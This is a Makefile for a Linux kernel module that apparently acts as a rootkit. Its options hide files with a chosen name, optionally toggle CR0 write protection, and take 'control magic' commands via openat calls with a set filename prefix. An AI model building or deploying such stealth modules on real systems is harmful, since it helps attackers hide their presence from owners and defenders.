obj-m += main.o
KVERSION = $(shell uname -r)
CFLAGS_main.o := -DCONTROL_PREFIX=\"$(CONTROL_PREFIX)\"
CFLAGS_main.o += -DUSE_CR0=$(USE_CR0)
CFLAGS_main.o += -DHIDDEN_NAME=\"$(HIDDEN_NAME)\"

# Check if the USE_CR0 variable is provided and is valid

all:
	make -C /lib/modules/$(KVERSION)/build M=$(PWD) CONTROL_PREFIX=$(CONTROL_PREFIX) modules


ifeq ($(USE_CR0),)
	$(error USE_CR0 is not provided. Please specify USE_CR0=0 or USE_CR0=1)
else ifneq ($(USE_CR0),0)
	ifneq ($(USE_CR0),1)
		$(error Invalid value for USE_CR0. Please specify USE_CR0=0 or USE_CR0=1)
	endif
endif

ifeq ($(HIDDEN_NAME),)
	$(error HIDDEN_NAME is not provided. Please specify HIDDEN_NAME (files with this name will be hidden))
endif

ifeq ($(CONTROL_PREFIX),)
	$(error CONTROL_PREFIX is not provided. Please specify a CONTROL_PREFIX (an openat syscall with a filename argument starting with CONTROL_PREFIX will be used a control magic))
endif

clean:
	make -C /lib/modules/$(KVERSION)/build M=$(PWD) clean